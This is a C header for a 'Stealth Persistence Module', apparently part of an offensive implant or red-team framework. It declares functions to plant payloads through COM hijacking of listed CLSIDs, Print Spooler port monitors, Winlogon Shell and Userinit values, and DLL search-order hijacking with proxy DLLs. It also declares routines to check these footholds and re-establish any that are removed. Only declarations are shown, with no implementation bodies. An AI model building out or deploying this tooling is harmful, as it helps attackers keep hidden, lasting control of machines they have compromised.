/*
 * Stealth Persistence Module
 *
 * Alternative persistence mechanisms for W6 workstream:
 * - COM hijacking (InprocServer32)
 * - Print Spooler port monitor
 * - Winlogon Shell/Userinit
 * - DLL search order hijacking
 *
 * Ported from:
 * - nccgroup/acCOMplice (MIT) - COM hijacking toolkit
 * - airzero24/PortMonitorPersist (MIT) - Port monitor persistence
 * - cocomelonc tutorials - C++ examples
 */

#ifndef STEALTH_PERSISTENCE_H
#define STEALTH_PERSISTENCE_H

#include <windows.h>

#ifdef __cplusplus
extern "C" {
#endif

/* Persistence mechanism types */
typedef enum PersistenceType {
    PERSIST_COM_HIJACK = 1,
    PERSIST_PORT_MONITOR = 2,
    PERSIST_WINLOGON_SHELL = 3,
    PERSIST_WINLOGON_USERINIT = 4,
    PERSIST_DLL_HIJACK = 5,
    PERSIST_SCHEDULED_TASK = 6,
    PERSIST_WMI_SUBSCRIPTION = 7
} PersistenceType;

/* Persistence entry for tracking */
typedef struct PersistenceEntry {
    PersistenceType type;
    WCHAR identifier[256];      /* CLSID, monitor name, etc. */
    WCHAR targetPath[MAX_PATH]; /* DLL/EXE path */
    WCHAR backupData[1024];     /* Original value for restore */
    BOOL active;
} PersistenceEntry;

/* ================================================================
 * COM Hijacking Functions
 * ================================================================ */

/* Well-known hijackable CLSIDs */
#define CLSID_MMDEVICE_ENUMERATOR L"{BCDE0395-E52F-467C-8E3D-C4579291692E}"
#define CLSID_SHELL_FOLDER L"{D969A300-E7FF-11D0-A93B-00A0C90F2719}"
#define CLSID_CONTEXT_MENU L"{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}"

/* Register COM hijack in HKCU (user-level, no admin required) */
BOOL Persist_ComHijackRegister(
    const WCHAR* clsid,
    const WCHAR* dllPath,
    WCHAR* outBackupValue,
    size_t backupValueCch);

/* Remove COM hijack and restore original */
BOOL Persist_ComHijackRemove(
    const WCHAR* clsid,
    const WCHAR* originalValue);

/* Check if CLSID is currently hijacked by us */
BOOL Persist_ComHijackIsActive(
    const WCHAR* clsid,
    const WCHAR* expectedDllPath);

/* Find hijackable CLSIDs on the system */
DWORD Persist_ComFindHijackable(
    WCHAR** outClsids,
    DWORD maxClsids);

/* ================================================================
 * Print Spooler Port Monitor Functions
 * ================================================================ */

/* Register port monitor DLL (requires admin) */
BOOL Persist_PortMonitorRegister(
    const WCHAR* monitorName,
    const WCHAR* dllPath);

/* Remove port monitor */
BOOL Persist_PortMonitorRemove(const WCHAR* monitorName);

/* Check if port monitor is registered */
BOOL Persist_PortMonitorIsActive(const WCHAR* monitorName);

/* Use AddMonitor API for immediate load */
BOOL Persist_PortMonitorAddImmediate(
    const WCHAR* monitorName,
    const WCHAR* dllPath);

/* ================================================================
 * Winlogon Persistence Functions
 * ================================================================ */

/* Append to Winlogon Shell value */
BOOL Persist_WinlogonShellAppend(
    const WCHAR* exePath,
    WCHAR* outOriginalValue,
    size_t originalValueCch);

/* Restore Winlogon Shell to original */
BOOL Persist_WinlogonShellRestore(const WCHAR* originalValue);

/* Append to Winlogon Userinit value */
BOOL Persist_WinlogonUserinitAppend(
    const WCHAR* exePath,
    WCHAR* outOriginalValue,
    size_t originalValueCch);

/* Restore Winlogon Userinit to original */
BOOL Persist_WinlogonUserinitRestore(const WCHAR* originalValue);

/* ================================================================
 * DLL Search Order Hijacking Functions
 * ================================================================ */

/* Known DLL hijack targets */
typedef struct DllHijackTarget {
    WCHAR dllName[64];          /* e.g., "version.dll" */
    WCHAR targetExe[MAX_PATH];  /* Process that loads it */
    WCHAR hijackPath[MAX_PATH]; /* Where to place hijack DLL */
} DllHijackTarget;

/* Find potential DLL hijack opportunities */
DWORD Persist_DllHijackFindTargets(
    DllHijackTarget* outTargets,
    DWORD maxTargets);

/* Install proxy DLL for hijacking */
BOOL Persist_DllHijackInstall(
    const WCHAR* dllName,
    const WCHAR* hijackPath,
    const WCHAR* payloadDllPath);

/* Remove hijack DLL */
BOOL Persist_DllHijackRemove(const WCHAR* hijackPath);

/* Generate proxy DLL that forwards to original */
BOOL Persist_DllHijackGenerateProxy(
    const WCHAR* originalDllPath,
    const WCHAR* outputPath,
    const WCHAR* payloadDllPath);

/* ================================================================
 * Persistence State Management
 * ================================================================ */

/* Track all persistence mechanisms in state file */
typedef struct PersistenceState {
    WCHAR stateFilePath[MAX_PATH];
    PersistenceEntry* entries;
    DWORD entryCount;
    DWORD entryCapacity;
} PersistenceState;

/* Initialize persistence state */
BOOL Persist_StateInit(
    PersistenceState* state,
    const WCHAR* stateFilePath);

/* Free persistence state */
void Persist_StateFree(PersistenceState* state);

/* Load state from file */
BOOL Persist_StateLoad(PersistenceState* state);

/* Save state to file */
BOOL Persist_StateSave(const PersistenceState* state);

/* Add entry to state */
BOOL Persist_StateAddEntry(
    PersistenceState* state,
    PersistenceType type,
    const WCHAR* identifier,
    const WCHAR* targetPath,
    const WCHAR* backupData);

/* Remove all persistence and restore originals */
BOOL Persist_RemoveAll(PersistenceState* state);

/* Verify all persistence mechanisms are still active */
BOOL Persist_VerifyAll(
    PersistenceState* state,
    DWORD* outActiveCount,
    DWORD* outInactiveCount);

/* Re-establish any inactive persistence */
BOOL Persist_RestoreAll(PersistenceState* state);

#ifdef __cplusplus
}
#endif

#endif /* STEALTH_PERSISTENCE_H */
